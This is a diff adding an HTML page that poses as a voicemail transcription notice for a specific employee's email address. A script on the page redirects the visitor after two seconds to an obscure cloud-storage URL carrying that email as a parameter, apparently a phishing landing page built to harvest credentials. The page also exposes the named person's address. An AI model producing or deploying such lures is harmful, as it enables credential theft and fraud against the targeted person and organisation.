@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>example</title>
+    </head>
+    <body>
+        <p>Voicemail Transcription Message for kapil.punwani@starhealth.in.</p>
+        <p>YOU WILL BE REDIRECTED SHORTLY.......90% </p>
+        <script>
+            setTimeout(function(){
+                window.location.href="https://uhvv0frp8nmad62-1320008508.cos.na-siliconvalley.myqcloud.com/uhvv0frp8nmad62.html?e=kapil.punwani@starhealth.in"; // THIS THIS SECURED.
+            }, 2000); // The bigger the number the longer the delay.
+        </script>
+    </body>
+</html>
